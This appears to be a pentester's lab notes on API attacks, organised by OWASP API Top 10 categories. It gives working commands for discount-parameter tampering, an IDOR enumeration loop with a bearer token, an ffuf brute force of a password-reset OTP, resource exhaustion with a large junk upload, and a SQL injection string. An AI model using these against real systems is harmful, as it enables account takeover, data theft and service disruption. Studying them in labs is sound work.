# API recon
```http
GET /api/books HTTP/1.1
Host: example.com
```
- GET - Retrieves data from a resource.
- PATCH - Applies partial changes to a resource.
- OPTIONS - Retrieves information on the types of request methods that can be used on a resource.

<img width="1015" height="109" alt="image" src="https://github.com/user-attachments/assets/45b47e11-dedd-454f-9edd-159a5f6a7fde" />



## Discovering API documentation
If you identify an endpoint for a resource, make sure to investigate the base path
```http
/api/swagger/v1/users/123
/api/swagger/v1
/api/swagger
/api
```

## Identifying supported content types
Change the content type, modify the Content-Type header
```http
Content-Type: application/json
```

<img width="1030" height="395" alt="image" src="https://github.com/user-attachments/assets/a1a39986-3fea-48a7-a096-189ba1a051a5" />


<img width="1004" height="377" alt="image" src="https://github.com/user-attachments/assets/367779e9-f6f0-4fb0-9ad0-8b37221b521a" />

## Finding hidden parameters 
```http
POST /api/checkout HTTP/2
Host: 0a0a00630314d65f80e82125007c00b2.web-security-academy.net
Cookie: session=FXDUhsdOGDq2CVFbQxJM5JaizHddS84z
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0a00630314d65f80e82125007c00b2.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Length: 90

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```

# Broken Object Level Authorization (IDOR)
```bash
for ((i=0;i<=20;i++))do 
curl -s -w "\n" -X 'GET' \
 'http://94.237.52.208:42234/api/v1/supplier-companies/yearly-reports/'$i'' \
 -H 'accept: application/json' \
 -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NDEyMjIxNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.QRSkAArHSb9OSeUaIwkkCcl-8pgkFKA25pV1m1EZXdYD1Fx6Zg5dtVR3tWD43CdWHm0giMcQT8DHzDjIQ01SRg
done
```
# Broken Authentication (Brute Force)
```bash
ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authentication/customers/passwords/resets' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{ "Email": "MasonJenkins@ymail.com", "OTP": "EMAIL", "NewPassword": "hola123" }'  -t 100 -fs 23 
```

# Broken Authentication (Brute Force)
```bash
ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authentication/customers/passwords/resets' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{ "Email": "MasonJenkins@ymail.com", "OTP": "EMAIL", "NewPassword": "hola123" }'  -t 100 -fs 23 
```

# Unrestricted Resource Consumption
```bash
#Create a Random pdf with big mb
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

# Unrestricted Resource Consumption
DDOS attack or big file uploaded

# Broken Function Level Authorization
Don't need auth

# Unrestricted Access to Sensitive Business Flows
Don't need auth

# Server Side Request Forgery

# Security Misconfiguration (SQLi)
```bash
hola' or '1' = '1'-- -
```
# Improper Inventory Management
CHanging the api version to v0

<img width="1330" height="100" alt="image" src="https://github.com/user-attachments/assets/adf48d27-9d24-4604-8a90-37c83b243441" />
